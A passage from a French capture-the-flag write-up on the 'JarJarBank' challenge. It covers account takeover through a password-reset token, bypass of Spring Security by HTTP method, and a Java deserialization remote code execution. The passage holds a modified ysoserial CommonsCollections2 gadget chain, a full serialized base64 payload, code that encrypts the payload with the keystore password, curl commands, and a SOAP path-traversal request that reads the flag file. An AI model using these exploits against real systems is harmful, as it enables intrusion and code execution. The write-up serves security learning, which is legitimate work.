</transactionData></ns3:transactionResponse></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

Super, je me peux maintenant appeler l'API `/api/v1/user/savePassword` pour changer le mot de passe de l'utilisateur avec le bon token, m'authentifier, et récupérer le premier flag !

```sh
curl -X POST https://jarjarbank.chall.malicecyber.com/api/v1/user/savePassword -H 'Content-Type: application/json' -d '{"token":"MvD1VUC8fxn6F4IPlomMq3Ud1EHrfEXJ","newPassword":"((?:[A-Za-z0-9+/]{4})*(?:[A-Z"}'
{"message":"Password reset successfully"}

curl -X POST https://jarjarbank.chall.malicecyber.com/api/v1/auth/authenticate -H 'Content-Type: application/json' -d '{"email":"DGHACKCustomerUser@dghack.fr","password":"((?:[A-Za-z0-9+/]{4})*(?:[A-Z"}'
{"headers":{},"body":{"token":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJER0hBQ0tDdXN0b21lclVzZXJAZGdoYWNrLmZyIiwiaWF0IjoxNzAxNDMzMzU1LCJleHAiOjE3MDE0MzY5NTV9.6EFyW9AHPi1vNCdi-zeYptXJ1fru96I6mOpqBJPhxaw","type":"Bearer","id":3,"email":"DGHACKCustomerUser@dghack.fr"},"statusCode":"OK","statusCodeValue":200}

export token="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJER0hBQ0tDdXN0b21lclVzZXJAZGdoYWNrLmZyIiwiaWF0IjoxNzAxNDMzMzU1LCJleHAiOjE3MDE0MzY5NTV9.6EFyW9AHPi1vNCdi-zeYptXJ1fru96I6mOpqBJPhxaw"

curl -v https://jarjarbank.chall.malicecyber.com/api/v1/flag/getFirstFlag -H "Authorization: Bearer $token"
{"message":"Congratz ! Here is your first flag: DGHACK{F1l3_r34d_l0gs_t0_4cc0unt_t4k30v3r}. Keep digging and you'll find another flag :)"}
```

**Second Step : Récupération du Flag 2**

L'étape numéro 2 m'a demandé beaucoup de patience. Je me suis orientée vers le leurre de la SQLi, je pensais qu'il fallait réaliser une élévation de privilèges en leakant l'email/password du support ou de l'admin mais je faisais fausse route.

En parcourant les différentes classes du projet Java, je me suis déjà aperçu de plusieurs choses que j'ai omis de préciser plus tôt.
Le projet utilise plusieurs libs, dont deux qui ne sont pas officielles :

- transaction-api.jar, qui contenait un service d'import de transaction et qui est utilisé par le controller de l'API `/api/v1/transaction/import`,
- jarjarbank-collections.jar, contenant une version modifiée de la très utilisée org.apache.commons.collections4.

Après lecture de la classe `TransactionRestController`, on se rend compte qu'il attend une donnée "transactionData" à fournir dans l'appel REST.

```java
@RestController
@RequestMapping({"api/v1/transaction"})
public class TransactionRestController {
    private static final Logger LOGGER = LoggerFactory.getLogger(TransactionRestController.class);
    @Autowired
    private TransactionService transactionService;
    @Autowired
    private MessageSource messages;

    public TransactionRestController() {
    }

    @RequestMapping({"/import"})
    public ResponseEntity<?> importTransaction(HttpServletRequest request) {
        ResponseEntity response;
        try {
            LOGGER.info(String.format("New transaction import from ip: '%s'", request.getRemoteAddr()));
            String transactionData = request.getParameter("transaction");
            if (transactionData == null) {
                return ResponseEntity.badRequest().body(new MessageResponse(this.messages.getMessage("message.fileTransactionEmpty", (Object[])null, request.getLocale())));
            }

            Transaction transactionToImport = (Transaction)TransactionAPI.getTransaction(transactionData);
            response = ResponseEntity.ok(transactionToImport);
        } catch (Throwable var5) {
            LOGGER.error("Fail to import transaction from file", var5);
            response = ResponseEntity.badRequest().body(new MessageResponse(var5.getMessage()));
        }

        return response;
    }
}
```

En décompilant et reversant le code du service de la lib transaction-api, on se rend compte que la donnée doit être formattée.

```java
public class TransactionAPI {
   private static final Logger LOGGER = LoggerFactory.getLogger(TransactionAPI.class);

   public static Object getTransaction(String paramString) throws Exception {
      String version = getVersion(paramString);
      String data = getData(paramString);
      return TransactionImporter.importTransaction(data, getTransactionConfig(version));
   }

   private static String getData(String data) {
      Pattern pattern = Pattern.compile("\\$(?:\\d|LEGACY)\\$((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+]{4})$)");
      Matcher matcher = pattern.matcher(data);
      if (!matcher.find()) {
         LOGGER.error("Unable to retrieve data from transaction file");
         throw new IllegalStateException("Wrong transaction data format.");
      } else {
         return matcher.group(1);
      }
   }

   private static String getVersion(String paramString) {
      String version;
      if (paramString.startsWith("$1$")) {
         version = "1.0";
      } else if (paramString.startsWith("$2$")) {
         version = "2.0";
      } else {
         if (!paramString.startsWith("$LEGACY$")) {
            throw new IllegalStateException("Unrecognized version");
         }

         version = "LEGACY";
      }

      return version;
   }

   private static CryptoConfigurator getTransactionConfig(String version) throws Exception {
      CryptoConfigurator cryptoConfig = new CryptoConfigurator();
      InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream("transaction-keystore.jks");
      if (inputStream == null) {
         throw new Exception("Couldn't load keystore!");
      } else {
         ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
         IOUtils.copy((InputStream)inputStream, (OutputStream)byteArrayOutputStream);
         cryptoConfig.setKeyStore(byteArrayOutputStream.toByteArray());
         cryptoConfig.setVerifyingAlias("TransactionV" + version);
         cryptoConfig.setSecretKey("DGH@CK2023!".toCharArray());
         cryptoConfig.setVersion(version);
         cryptoConfig.setKeyStoreType("JKS");
         IOUtils.closeQuietly(inputStream);
         return cryptoConfig;
      }
   }
}
```

Tout d'abord, elle doit être préfixée par une version: `$1$, $2$ ou $LEGACY$``, puis une chaîne encodée en base64 `Pattern.compile("\\$(?:\\d|LEGACY)\\$((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+]{4})$)");`. Elle est ensuite envoyée dans la fonction statique `TransactionImporter.importTransaction(data, getTransactionConfig(version))`. Le deuxième paramètre étant un "CryptoConfigurator" généré à partir d'un key store (contenu dans la lib) protégé par un password (ouf en clair ici) : "DGH@CK2023!". Passons à la suite.

```java
public class TransactionImporter {
   protected static Object importTransaction(String transactionData, CryptoConfigurator cryptoConfig) throws Exception {
      TransactionEncryptorHelper transactionEncryptor = new TransactionEncryptorHelper();
      transactionEncryptor.initialize(cryptoConfig.getVersion());
      byte[] decoded_byteArray = Base64.getDecoder().decode(transactionData.getBytes(StandardCharsets.UTF_8));
      decoded_byteArray = transactionEncryptor.decrypt(decoded_byteArray);
      return transactionEncryptor.verify(decoded_byteArray, cryptoConfig);
   }
}
``````

Le code de la fonction `TransactionImporter.importTransaction` montre que la donnée passe ensuite dans deux fonctions de la classe `TransactionEncryptorHelper`:

- transactionEncryptor.decrypt(decoded_byteArray)
- transactionEncryptor.verify(decoded_byteArray, cryptoConfig)

```java
public class TransactionEncryptorHelper {
   private boolean context;
   private TransactionEncryptor transactionEncryptor;
   private static final Logger LOGGER = LoggerFactory.getLogger(TransactionEncryptorHelper.class);

   public void initialize(String version) throws Exception {
      LOGGER.info(String.format("Initialization of TransactionEncryptor for version '%s'", version));
      if (version.equals("1.0")) {
         this.transactionEncryptor = new DESTransactionEncryptor();
      } else if (version.equals("2.0")) {
         this.transactionEncryptor = new AESTransactionEncryptor();
      } else {
         this.transactionEncryptor = new RC4TransactionEncryptor();
      }

      this.context = true;
   }

   public byte[] decrypt(byte[] data) throws Exception {
      if (!this.context) {
         throw new IllegalStateException("Transaction Encryptor has not been initialized");
      } else {
         return this.transactionEncryptor.decrypt(data);
      }
   }

   public Object verify(byte[] data, CryptoConfigurator cryptoConfig) throws Exception {
      LOGGER.info("Verifying transaction signature");
      PublicKey pubKey = Utils.getPublicKey(cryptoConfig);
      ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(data));
      SignedObject signedTransaction = (SignedObject)in.readObject();
      Signature signature = Signature.getInstance(this.transactionEncryptor.getAlgorithm());
      if (!signedTransaction.verify(pubKey, signature)) {
         LOGGER.error("Unable to verify the signature of the transaction file to be imported");
         throw new IOException("Unable to verify signature");
      } else {
         return signedTransaction.getObject();
      }
   }
}
```

La fonction decrypt permet le déchiffrement de la chaîne encodée en base64 en fonction de l'algorithme (version: `$1$,$2$,$LEGACY$`) utilisée.
La fonction verify permet de vérifier que la transaction envoyée en paramètre est valide et signée.
MAIIIIS : `SignedObject signedTransaction = (SignedObject)in.readObject();`, la donnée transaction envoyée par l'appelant est deserialisée !!!
STOP, on s'arrête là et on fait une pause, remontons le temps.

On émet l'hypothèse dès maintenant qu'on va pouvoir faire une attaque par déserialisation.

Cependant, il faut:

- Interroger l'API `/api/v1/transaction/import`, mais celle-ci est protégée, il faut avoir le rôle ADMIN_UPDATE.
- Crafter un payload bien formatté dans la donnée qu'on va lui passer, mais celui-ci doit passer les fonctions contrôles et de déchiffrement, ce n'est pas un réel problème car les clés sont cachées dans le keystore dont la clef nous est donnée.
- Trigger la deserialisation avec un gadget pour provoquer une RCE et lire le fichier /flag.

C'est à cet instant que j'ai perdu beaucoup, beaucoup, beaucoup de temps à chercher une élévation de privilège.
En attendant, je souhaitais tester cette API en tant qu'admin. Je lance donc le projet sous mon environnement pour le tester avec l'utilisateur ADMIN, puisque j'ai le mot de passe.

Et là, surprise, l'API n'est pas accessible même avec le compte ADMIN. Après avoir averti le builder, celui-ci me remonte en effet que c'est une erreur mais que ça ne devrait pas poser de soucis pour la suite du challenge.

C'est alors que je comprends qu'il va falloir bypass la security chain en étant simplement utilisateur.

Regardons une nouvelle fois de plus près cette dernière.

```java
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.GET, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.PUT, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_READ.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.POST, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_UPDATE.name()})
            .requestMatchers(new RequestMatcher[]{AntPathRequestMatcher.antMatcher(HttpMethod.DELETE, "/api/v1/transaction/**")}))
            .hasAnyAuthority(new String[]{Permission.ADMIN_DELETE.name()})
```

L'API est protégée sur les méthodes GET/PUT/POST/DELETE.

Regardons une nouvelle fois le code du controller de l'API.

```java
@RestController
@RequestMapping({"api/v1/transaction"})
public class TransactionRestController {
    private static final Logger LOGGER = LoggerFactory.getLogger(TransactionRestController.class);
    @Autowired
    private TransactionService transactionService;
    @Autowired
    private MessageSource messages;

    public TransactionRestController() {
    }

    @RequestMapping({"/import"})
    public ResponseEntity<?> importTransaction(HttpServletRequest request) {
        ResponseEntity response;
        try {
            LOGGER.info(String.format("New transaction import from ip: '%s'", request.getRemoteAddr()));
            String transactionData = request.getParameter("transaction");
            if (transactionData == null) {
                return ResponseEntity.badRequest().body(new MessageResponse(this.messages.getMessage("message.fileTransactionEmpty", (Object[])null, request.getLocale())));
            }

            Transaction transactionToImport = (Transaction)TransactionAPI.getTransaction(transactionData);
            response = ResponseEntity.ok(transactionToImport);
        } catch (Throwable var5) {
            LOGGER.error("Fail to import transaction from file", var5);
            response = ResponseEntity.badRequest().body(new MessageResponse(var5.getMessage()));
        }

        return response;
    }
}
```

Regardons une nouvelle fois.

Regardons une nouvelle fois.

Regardons une nouvelle fois.

Regardons une nouvelle fois.

...

Regardons une nouvelle fois.

Vous le voyez ?

C'est le détail le plus subtile glissé dans le code... mais qui reflète bien l'univers complexe et réaliste du monde du développement.

Je suis passé au moins 30 fois dessus sans le voir.

Vous le voyez ?

Ce truc ? `@RequestMapping({"/import"})`

Oui, cette simple annotation.

Après avoir bien lu la documentation de Spring, cette annotation ouvre une API, mais positionnée sur une méthode et non la classe et bien ça ouvre tout le champ des possible. Logiquement le développeur aurait du utiliser un `@PostMapping` pour autoriser que le `POST` sur cette API.

Et bien la voilà notre porte d'entrée ! On va pouvoir appeler l'API avec une autre méthode que POST/GET/PUT/DELETE, pour ma part, j'ai choisi `HEAD`.

Il ne "reste" plus qu'à crafter un bon payload pour tweak la deserialisation.

Après lectures de plusieurs excellents articles sur celle-ci, beaucoup utilisent le projet : https://github.com/frohoff/ysoserial (merci à lui) pour crafter des payloads. On se rend compte que le projet propose beaucoup d'exploits pour les org.apache.commons.collections et org.apache.commons.collections4.

TILT, génial, on va pouvoir regarder ce que contient l'autre lib plus en détails: jarjar-collections.jar.

Celle-ci était légèrement modifiée pour refuser les payloads classiques déjà proposés par le projet ysoserial, il fallait mettre les mains dans le moteur pour ce coup là.

Après plusieurs essais, voilà ma gadget finale déviée de la CommonCollections2 d'ysoserial.

```java
/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare() // FixedOrderComparator
// ADD                DefaultMap.get()
// ADD                  ChainedTransformer.transform()
						InvokerTransformer.transform() // LegacyTransformer
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
@Authors({ Authors.FROHOFF })
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {

    public Queue<Object> getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);
        // mock method name until armed
        final LegacyTransformer transformer = new LegacyTransformer("toString", new Class[0], new Object[0]);

        final String[] execArgs = new String[] { command };

        final Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new LegacyTransformer("getMethod", new Class[] {
                String.class, Class[].class }, new Object[] {
                "getRuntime", new Class[0] }),
            new LegacyTransformer("invoke", new Class[] {
                Object.class, Object[].class }, new Object[] {
                null, new Object[0] }),
            new LegacyTransformer("exec",
                new Class[] { String.class }, execArgs),
            new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        // create queue with numbers and basic comparator
        Comparator fixed = new FixedOrderComparator();
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,fixed);

        Map inner1 = new HashMap();
        Map inner2 = new HashMap();

        Map defaultedMap1 = DefaultedMap.defaultedMap(inner1, transformerChain);
        Map defaultedMap2 = DefaultedMap.defaultedMap(inner2, transformerChain);

        // switch method called by comparator
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        Reflections.setFieldValue(fixed, "map", defaultedMap1);
        Reflections.setFieldValue(queue, "size", 2);

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = defaultedMap2;

        return queue;
    }
```


    Note:

    Je me suis beaucoup concentré sur la CommonCollections7 dans un premier temps car elle me semblait bien adapté, mais j'ai lâché l'affaire en voyant des "null" arriver dans les logs. 
    J'ai découvert plus tard (post flag après discussion avec un autre participant) que même si celle-ci provoquait des null à cause de l'objet transient, la RCE fonctionnait. 
    Comme un idiot, je vérifiai pas que la RCE avait bien trigger...

Après avoir généré le payload, il faut maintenant le chiffrer avec le même algorithme (et même clef) par lequel il va se "faire déchiffrer" de la fonction de déchiffrement de la lib `transaction-api.jar`.

```java
   public static void main(String[] args) throws Exception {
      // RM RCE crafted with ysoserial => cp /flag /tmp/GiveMeAKissMyFriend1
      String final_b64_payload = "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuRml4ZWRPcmRlckNvbXBhcmF0b3IBJiVRquhQYQIABEkAB2NvdW50ZXJaAAhpc0xvY2tlZEwAA21hcHQAD0xqYXZhL3V0aWwvTWFwO0wAFXVua25vd25PYmplY3RCZWhhdmlvcnQAWExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L2NvbXBhcmF0b3JzL0ZpeGVkT3JkZXJDb21wYXJhdG9yJFVua25vd25PYmplY3RCZWhhdmlvcjt4cAAAAAAAc3IAMG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQubWFwLkRlZmF1bHRlZE1hcAAAEepxxNpjAwABTAAFdmFsdWV0AC1Mb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zNC9UcmFuc2Zvcm1lcjt4cHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALltMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zNC9UcmFuc2Zvcm1lcjt4cHVyAC5bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuVHJhbnNmb3JtZXI7OYE6+wjaP6UCAAB4cAAAAAVzcgA8b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnR0ABJMamF2YS9sYW5nL09iamVjdDt4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5mdW5jdG9ycy5MZWdhY3lUcmFuc2Zvcm1lcgEOyZLWmst+AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABwAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAcc3EAfgAUdXEAfgAZAAAAAnB1cQB+ABkAAAAAdAAGaW52b2tldXEAfgAcAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGXNxAH4AFHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABxybSAvdG1wL0dpdmVNZUFLaXNzTXlGcmllbmQxdAAEZXhlY3VxAH4AHAAAAAFxAH4AIXNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eH5yAFZvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmNvbXBhcmF0b3JzLkZpeGVkT3JkZXJDb21wYXJhdG9yJFVua25vd25PYmplY3RCZWhhdmlvcgAAAAAAAAAAEgAAeHIADmphdmEubGFuZy5FbnVtAAAAAAAAAAASAAB4cHQACUVYQ0VQVElPTncEAAAAA3NyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABdMAAVfbmFtZXEAfgAWTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAawyv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAHHJtIC90bXAvR2l2ZU1lQUtpc3NNeUZyaWVuZDEIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB15c29zZXJpYWwvUHduZXI4MDU0MjI3MzM1MjUwNwEAH0x5c29zZXJpYWwvUHduZXI4MDU0MjI3MzM1MjUwNzsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+AEEAAAHUyv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNxAH4AB3EAfgAMc3EAfgA1P0AAAAAAAAB3CAAAABAAAAAAeHh4";
      byte[] to_decode_payload = Base64.getDecoder().decode(final_b64_payload.getBytes(StandardCharsets.UTF_8));

      CryptoConfigurator cryptoConfig = TransactionAPI.getTransactionConfig("2.0");

      TransactionEncryptorHelper transactionEncryptor = new TransactionEncryptorHelper();
      transactionEncryptor.initialize(cryptoConfig.getVersion());
      byte[] decoded_byteArray = transactionEncryptor.decrypt(to_decode_payload);

      String final_payload = "$2$" + new String(Base64.getEncoder().encode(decoded_byteArray));
      // System.out.println(my_payload+ " b64:"+b64_payload);
      System.out.println("My final payload");
      System.out.println(final_payload);
      System.out.println("Does it match ? " + getData(final_payload));
   }
```

Je craft alors le payload avec une RCE pour copier le fichier `/flag` dans le dossier `/tmp/` sous le nom `GiveMeAKissMyFriend1` pour éviter qu'il soit trop facile à "capter", noter qu'il faut qu'il termine par un digit pour ensuite le lire avec le service SOAP ;-).

Fichier requestSecretFile.xml
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
    <SOAP-ENV:Body>
        <ns3:transactionRequest xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
            <transactionFile>../../tmp/GiveMeAKissMyFriend1</transactionFile>
        </ns3:transactionRequest>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

```sh
export payload="X+KMJ4D2a0w5qdCFFTDh4PbzcdzyVyp4FqAPTnYJlxu7eJ/NBKgY5GqelIOr4acpzEhfqkA7PcI/NZ42z4wkdjc8kskfAbH6vDckOVxK3ldXnoyS0ZxKga3lIYAod+ZrdVciq1ghpgW4hKHA5Ognj6Fe08I4HH3M5/pmnzBYJJNEcSZNvE6OLtEBaccfdeNiWDG/Ore8QfbuEf4KSJMc/0oVjwzBOA7QM34sjaOMBg9z+s1/iZ8aNnp9dccl6IIddUDMSzY+yoP6jU41Z6NqZ1ADSpzaVeVv197j/oyqt4vwQUHQaXgsDnBH3wRFABPaPR0/Fq06HNyMiV5mt1/1EbCZj1CRXWw1jxeP8tyDJ6Fj2i2TzI1+D5FOqvCkP1WEL1LB9gBetYm4eKHrXAEUMtQUvJpzt/r2X46JiYhxePoE+X8ERXNi1xB0HggNu9XJtYMMu6TprfyFsc5c2nY4XQbGIRF4VAoAqPKF6CjSZQIEHc2tePBgc7TVRI8IhFPpUL++nAM1a4QKveVekppW74rHCdz5RVe6WYoPGVSLzXPxGNH2wZIpOYXyJVgAkoziZmglcjeZ20Ql4uZBRsmv5hGY34Ay+7heKJJZ/TSzXWFliJpmApn2JhleBEOaKUpcLfeQttGXRbc3qSzWFZ2TriBOcxXdaJMpm14unKbMCF5CrOh3oJydoCD0KKoHaYiJePQbNlgvTSAPojTqWRxHphEOzUpnoSA4cGZDttLhLTB8XCa9xf/zVrVQO3sV3K5QU9Nat/3E0wRRmweL/yX3LTVy4qiD5ArwzGzJykJth5gFaV6Pg+UzoUrI4E95sCzpwara9icpVxhtBPA9klFU5zJcWveeq1x9iAdLg8kANbOBZ3RoCSkqfUqnXRi3k0EVgkjfJcS6QtJc7ve+4e4PONU39Lkmq25nLSp7q5vTOM+DXuYmAZww3MCW45V64FzSKDTlVwoR3LAsc5N8rjWNgQn2EL3mm/UU44HfVb1PChvmlGdckgBAZx5i6I+00gVX8fuOH4Av56W5+/EJfg6+8MNCg7ctVnAh2ymxYSYOvDyB5GB4lyjTA4mbH4dHP8J5+KqCsw7ldWIosk8vegiBu3HacxbavowGwVagFETgmVsdr1jrO9nOs0SZIVFLN4oG4RATYqf4RcdeiUeU6Xg6XDrv0cqOHIb2DTVLFWCZFQO8V3ZbQdCDueXldPNym0JzqE1HvWYPdQetGGRMhle0TVL3fMQefxF3mh9SNX3bgO6G6IhV/6S5RDORkAEyaJLMsP938RvnGQP8q8MSKZeHUW2fmjM6tPxiLUGAU0orz2B2Ci+GIwpk/nsHqXPf5ZhqMgyXBL23gHqF99hxxxTHMQyRahx54sbcC8WjZcKZmDR8QNVxVbVPFbC5orNA46ZU3hybxbPMqLURXZd4WoP085lrkU4q5QazlmQD12EEGZiayNgh84XXD83kiuFGsI7iZWDv5Jud53NntQOJGPr4jxxKPgPeBhO7N8aKtEL1mbMw3GSmZUj8tl